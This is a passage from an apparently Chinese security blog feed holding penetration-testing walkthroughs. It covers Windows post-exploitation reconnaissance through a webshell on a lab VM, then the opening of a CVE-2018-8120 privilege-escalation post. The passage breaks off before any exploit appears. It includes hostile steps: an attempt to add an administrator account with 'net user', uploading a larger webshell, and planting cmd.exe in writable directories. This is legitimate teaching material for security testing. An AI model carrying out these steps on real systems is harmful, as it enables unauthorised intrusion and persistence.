systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           LIUWX-PC</span><br><span class="line">OS 名称:          Microsoft Windows 7 旗舰版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     liuwx</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00426-292-0000007-85837</span><br><span class="line">初始安装日期:     2019/4/16, 1:03:42</span><br><span class="line">系统启动时间:     2019/10/7, 22:19:24</span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3408 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3408 Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2017/5/19</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     3,103 MB</span><br><span class="line">可用的物理内存:   2,250 MB</span><br><span class="line">虚拟内存: 最大值: 6,205 MB</span><br><span class="line">虚拟内存: 可用:   5,295 MB</span><br><span class="line">虚拟内存: 使用中: 910 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 2 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB976902</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: 192.168.1.1</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.1.104</span><br><span class="line">                        [02]: fe80::10d5:df24:e351:af59</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/363.png" alt="图片"></p><h4 id="查看开放的端口"><a href="#查看开放的端口" class="headerlink" title="查看开放的端口"></a>查看开放的端口</h4><blockquote><p>netstat -ano  //查看当前开发的端口</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; netstat -ano</span><br><span class="line"></span><br><span class="line">活动连接</span><br><span class="line"></span><br><span class="line">  协议  本地地址          外部地址        状态           PID</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       760</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       324</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       416</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       852</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       924</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       508</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       956</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       532</span><br><span class="line">  TCP    127.0.0.1:8183         0.0.0.0:0              LISTENING       1296</span><br><span class="line">  TCP    192.168.1.104:80       192.168.1.100:53260    ESTABLISHED     4</span><br><span class="line">  TCP    192.168.1.104:139      0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    [::]:80                [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       760</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:3389              [::]:0                 LISTENING       324</span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       416</span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       852</span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       924</span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       508</span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       956</span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       532</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    924</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    924</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    324</span><br><span class="line">  UDP    192.168.1.104:137      *:*                                    4</span><br><span class="line">  UDP    192.168.1.104:138      *:*                                    4</span><br><span class="line">  UDP    [::]:500               *:*                                    924</span><br><span class="line">  UDP    [::]:4500              *:*                                    924</span><br><span class="line">  UDP    [::]:5355              *:*                                    324</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/365.png" alt="图片"></p><h4 id="查看当前系统启动的防护软件"><a href="#查看当前系统启动的防护软件" class="headerlink" title="查看当前系统启动的防护软件"></a>查看当前系统启动的防护软件</h4><blockquote><p>net start  //查看正在运行的服务列表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net start</span><br><span class="line">已经启动以下 Windows 服务: </span><br><span class="line"></span><br><span class="line">   Acunetix WVS Scheduler </span><br><span class="line">   Application Experience </span><br><span class="line">   Application Host Helper Service</span><br><span class="line">   Application Information</span><br><span class="line">   Base Filtering Engine</span><br><span class="line">   Certificate Propagation</span><br><span class="line">   COM+ Event System</span><br><span class="line">   COM+ System Application</span><br><span class="line">   Computer Browser</span><br><span class="line">   Cryptographic Services</span><br><span class="line">   DCOM Server Process Launcher</span><br><span class="line">   Desktop Window Manager Session Manager</span><br><span class="line">   DHCP Client</span><br><span class="line">   Diagnostic Policy Service</span><br><span class="line">   Diagnostic Service Host</span><br><span class="line">   Diagnostic System Host</span><br><span class="line">   Distributed Link Tracking Client</span><br><span class="line">   Distributed Transaction Coordinator</span><br><span class="line">   DNS Client</span><br><span class="line">   Group Policy Client</span><br><span class="line">   IIS Admin Service</span><br><span class="line">   IKE and AuthIP IPsec Keying Modules</span><br><span class="line">   IP Helper</span><br><span class="line">   IPsec Policy Agent</span><br><span class="line">   Microsoft FTP Service</span><br><span class="line">   Network Connections</span><br><span class="line">   Network List Service</span><br><span class="line">   Network Location Awareness</span><br><span class="line">   Network Store Interface Service</span><br><span class="line">   Offline Files</span><br><span class="line">   Plug and Play</span><br><span class="line">   Power</span><br><span class="line">   Print Spooler</span><br><span class="line">   Program Compatibility Assistant Service</span><br><span class="line">   Remote Desktop Configuration</span><br><span class="line">   Remote Desktop Services</span><br><span class="line">   Remote Desktop Services UserMode Port Redirector</span><br><span class="line">   Remote Procedure Call (RPC)</span><br><span class="line">   RPC Endpoint Mapper</span><br><span class="line">   Security Accounts Manager</span><br><span class="line">   Security Center</span><br><span class="line">   Server</span><br><span class="line">   Shell Hardware Detection</span><br><span class="line">   Software Protection</span><br><span class="line">   System Event Notification Service</span><br><span class="line">   Task Scheduler</span><br><span class="line">   TCP/IP NetBIOS Helper</span><br><span class="line">   Themes</span><br><span class="line">   User Profile Service</span><br><span class="line">   VMware Alias Manager and Ticket Service</span><br><span class="line">   VMware Tools</span><br><span class="line">   VMware 物理磁盘助手服务</span><br><span class="line">   Windows Audio</span><br><span class="line">   Windows Audio Endpoint Builder</span><br><span class="line">   Windows Defender</span><br><span class="line">   Windows Event Log</span><br><span class="line">   Windows Firewall</span><br><span class="line">   Windows Font Cache Service</span><br><span class="line">   Windows Management Instrumentation</span><br><span class="line">   Windows Process Activation Service</span><br><span class="line">   Windows Search</span><br><span class="line">   Windows Update</span><br><span class="line">   Workstation</span><br><span class="line">   World Wide Web Publishing Service</span><br><span class="line"></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/366.png" alt="图片"></p><p>对于每个服务的名称可以去百度查看到底是什么服务</p><h4 id="查看所运行的进程"><a href="#查看所运行的进程" class="headerlink" title="查看所运行的进程"></a>查看所运行的进程</h4><blockquote><p>tasklist  //显示运行在本地或远程计算机上的所有进程</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; tasklist</span><br><span class="line"></span><br><span class="line">映像名称                       PID 会话名              会话#       内存使用 </span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0         24 K</span><br><span class="line">System                           4 Services                   0      1,160 K</span><br><span class="line">smss.exe                       252 Services                   0      1,124 K</span><br><span class="line">csrss.exe                      336 Services                   0      5,464 K</span><br><span class="line">wininit.exe                    416 Services                   0      4,948 K</span><br><span class="line">csrss.exe                      424 Console                    1     15,832 K</span><br><span class="line">winlogon.exe                   480 Console                    1      7,692 K</span><br><span class="line">services.exe                   508 Services                   0      9,432 K</span><br><span class="line">lsass.exe                      532 Services                   0     10,292 K</span><br><span class="line">lsm.exe                        540 Services                   0      6,048 K</span><br><span class="line">svchost.exe                    652 Services                   0      9,496 K</span><br><span class="line">vmacthlp.exe                   716 Services                   0      4,276 K</span><br><span class="line">svchost.exe                    760 Services                   0      8,408 K</span><br><span class="line">svchost.exe                    852 Services                   0     18,340 K</span><br><span class="line">svchost.exe                    896 Services                   0     13,032 K</span><br><span class="line">svchost.exe                    924 Services                   0     31,876 K</span><br><span class="line">svchost.exe                    364 Services                   0     11,424 K</span><br><span class="line">svchost.exe                    324 Services                   0     15,412 K</span><br><span class="line">spoolsv.exe                   1160 Services                   0     16,192 K</span><br><span class="line">svchost.exe                   1188 Services                   0     13,752 K</span><br><span class="line">WVSScheduler.exe              1296 Services                   0     15,680 K</span><br><span class="line">svchost.exe                   1480 Services                   0      9,664 K</span><br><span class="line">svchost.exe                   1512 Services                   0      9,416 K</span><br><span class="line">inetinfo.exe                  1548 Services                   0     13,384 K</span><br><span class="line">VGAuthService.exe             1640 Services                   0     10,508 K</span><br><span class="line">vmtoolsd.exe                  1732 Services                   0     20,684 K</span><br><span class="line">svchost.exe                   1764 Services                   0     13,008 K</span><br><span class="line">svchost.exe                    956 Services                   0      5,520 K</span><br><span class="line">dllhost.exe                   2216 Services                   0     11,464 K</span><br><span class="line">msdtc.exe                     2352 Services                   0      8,072 K</span><br><span class="line">taskhost.exe                  2488 Console                    1      9,636 K</span><br><span class="line">sppsvc.exe                    2600 Services                   0     11,584 K</span><br><span class="line">WmiPrvSE.exe                  2888 Services                   0     12,972 K</span><br><span class="line">dwm.exe                       2972 Console                    1     68,880 K</span><br><span class="line">explorer.exe                  3040 Console                    1     48,120 K</span><br><span class="line">vmtoolsd.exe                  2696 Console                    1     22,540 K</span><br><span class="line">SearchIndexer.exe             1116 Services                   0     27,908 K</span><br><span class="line">InetMgr.exe                   3460 Console                    1     84,152 K</span><br><span class="line">cmd.exe                       3856 Console                    1      3,000 K</span><br><span class="line">conhost.exe                   3864 Console                    1      7,456 K</span><br><span class="line">svchost.exe                    320 Services                   0      4,608 K</span><br><span class="line">svchost.exe                   3200 Services                   0     23,988 K</span><br><span class="line">w3wp.exe                      3664 Services                   0     42,888 K</span><br><span class="line">VSSVC.exe                     3960 Services                   0      6,868 K</span><br><span class="line">svchost.exe                   3788 Services                   0      5,176 K</span><br><span class="line">cmd.exe                       2208 Services                   0      2,808 K</span><br><span class="line">conhost.exe                   2440 Services                   0      3,868 K</span><br><span class="line">tasklist.exe                  3412 Services                   0      5,792 K</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/367.png" alt="图片"></p><blockquote><p>查看C盘下的Program Files下的所有内容，包括隐藏文件 /a参数就是查看包括隐藏文件</p></blockquote><p>dir /a “c:\Program Files”</p><p>注意：如果目录中带有<code>空格</code>那么就要用双引号来列出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; dir /a &quot;c:\Program Files&quot;</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 E62C-2B4C</span><br><span class="line"></span><br><span class="line"> c:\Program Files 的目录</span><br><span class="line"></span><br><span class="line">2019/04/16  10:16    &lt;DIR&gt;          .</span><br><span class="line">2019/04/16  10:16    &lt;DIR&gt;          ..</span><br><span class="line">2019/04/16  01:05    &lt;DIR&gt;          Common Files</span><br><span class="line">2009/07/14  12:54               174 desktop.ini</span><br><span class="line">2011/04/12  22:57    &lt;DIR&gt;          DVD Maker</span><br><span class="line">2011/04/12  22:45    &lt;DIR&gt;          Internet Explorer</span><br><span class="line">2011/04/12  22:57    &lt;DIR&gt;          Microsoft Games</span><br><span class="line">2009/07/14  13:32    &lt;DIR&gt;          MSBuild</span><br><span class="line">2009/07/14  13:32    &lt;DIR&gt;          Reference Assemblies</span><br><span class="line">2009/07/14  13:09    &lt;DIR&gt;          Uninstall Information</span><br><span class="line">2019/04/16  01:07    &lt;DIR&gt;          VMware</span><br><span class="line">2011/04/12  22:45    &lt;DIR&gt;          Windows Defender</span><br><span class="line">2011/04/12  22:57    &lt;DIR&gt;          Windows Journal</span><br><span class="line">2011/04/12  22:45    &lt;DIR&gt;          Windows Mail</span><br><span class="line">2011/04/12  22:45    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">2019/04/16  01:03    &lt;DIR&gt;          Windows NT</span><br><span class="line">2011/04/12  22:45    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">2010/11/21  11:31    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">2011/04/12  22:45    &lt;DIR&gt;          Windows Sidebar</span><br><span class="line">2019/04/16  10:16    &lt;DIR&gt;          WinRAR</span><br><span class="line">               1 个文件            174 字节</span><br><span class="line">              19 个目录 11,146,342,400 可用字节</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/368.png" alt="图片"></p><h4 id="查看系统安装的文件"><a href="#查看系统安装的文件" class="headerlink" title="查看系统安装的文件"></a>查看系统安装的文件</h4><blockquote><p> wmic /NAMESPACE:”\root\CIMV2” PATH Win32_Product get name //列出系统安装了那些文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name</span><br><span class="line">Name                                                            </span><br><span class="line"></span><br><span class="line">Microsoft .NET Framework 4.5.2 (CHS)                            </span><br><span class="line"></span><br><span class="line">Microsoft .NET Framework 4.5.2                                  </span><br><span class="line"></span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161  </span><br><span class="line"></span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  </span><br><span class="line"></span><br><span class="line">IBM Security AppScan Standard                                   </span><br><span class="line"></span><br><span class="line">VMware Tools    </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/369.png" alt="图片"></p><blockquote><p>有的时候用菜刀执行命令网络会比较慢导致显示不出来，那么就可以在命令后面加一个”&gt;”来重定向到一个文本文件”1.txt”</p></blockquote><blockquote><p> wmic /NAMESPACE:”\root\CIMV2” PATH Win32_Product get name &gt; 1.txt</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/370.png" alt="图片"></p><h4 id="查看当前系统的补丁程序"><a href="#查看当前系统的补丁程序" class="headerlink" title="查看当前系统的补丁程序"></a>查看当前系统的补丁程序</h4><p>上面的<code>systeminfo</code>也可以看到安装了那些补丁程序</p><blockquote><p>wmic qfe get hotfixid //查看安装了那些补丁程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; wmic qfe get hotfixid</span><br><span class="line">HotFixID   </span><br><span class="line"></span><br><span class="line">KB2534111  </span><br><span class="line"></span><br><span class="line">KB976902   </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/371.png" alt="图片"></p><blockquote><p>wmic qfe get Caption,Description,HotFixID,InstalledOn //这个比上一条列出的信息比较详细</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">Caption                                     Description  HotFixID   InstalledOn  </span><br><span class="line"></span><br><span class="line">http://support.microsoft.com/?kbid=2534111  Hotfix       KB2534111  4/15/2019    </span><br><span class="line"></span><br><span class="line">http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010   </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/372.png" alt="图片"></p><h4 id="可读可写的目录"><a href="#可读可写的目录" class="headerlink" title="可读可写的目录"></a>可读可写的目录</h4><p>有的时候拿到一个<code>WebShell</code>，在执行虚拟终端的时候会失败，这个时候我们就需要找到一个<code>可读可写</code>的目录！</p><p>找到了可读可写的目录后，根据对方的操作系统位数，上传一个<code>cmd.exe</code>上去，然后就用我们上传上去的<code>cmd.exe</code>来执行命令，这样就可以了！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/373.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> 红队攻防 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win7本地溢出exploit提权-CVE-2018-8120</title>
      <link href="/2019/10/07/red-hack-1/"/>
      <url>/2019/10/07/red-hack-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1323099451&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这边是模拟拿到了一个<code>WebShell</code>的后渗透提权操作</p><h2 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h2><p>首先是看了看一个当前用户权限：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/338.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; whoami</span><br><span class="line"></span><br><span class="line">iis apppool\bjgs_v2.1</span><br></pre></td></tr></table></figure><p>是一个<code>IIS</code>的普通权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user</span><br><span class="line"></span><br><span class="line">\\ 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    liuwx                    </span><br><span class="line">命令运行完毕，但发生一个或多个错误。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user admin admin /add</span><br><span class="line"></span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/339.png" alt="图片"></p><p>创建用户：<code>拒绝访问</code>，那么权限还是比较低的！</p><p>先是上传个<code>大马</code>看看有没有<code>可读可写</code>的目录:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/340.png" alt="图片"></p><p>得到一个目录：</p><blockquote><p>文件夹：C:\inetpub\wwwroot\bjgs_v2.1 可读,可写。</p></blockquote><p>先看看当前主机的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           LIUWX-PC</span><br><span class="line">OS 名称:          Microsoft Windows 7 旗舰版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     liuwx</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00426-292-0000007-85837</span><br><span class="line">初始安装日期:     2019/4/16, 1:03:42</span><br><span class="line">系统启动时间:     2019/10/7, 9:39:32</span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3408 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3408 Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2017/5/19</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     3,103 MB</span><br><span class="line">可用的物理内存:   1,834 MB</span><br><span class="line">虚拟内存: 最大值: 6,205 MB</span><br><span class="line">虚拟内存: 可用:   4,956 MB</span><br><span class="line">虚拟内存: 使用中: 1,249 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 2 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB976902</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: 192.168.1.1</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.1.106</span><br><span class="line">                        [02]: fe80::10d5:df24:e351:af59</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br></pre></td></tr></table></figure><p><img 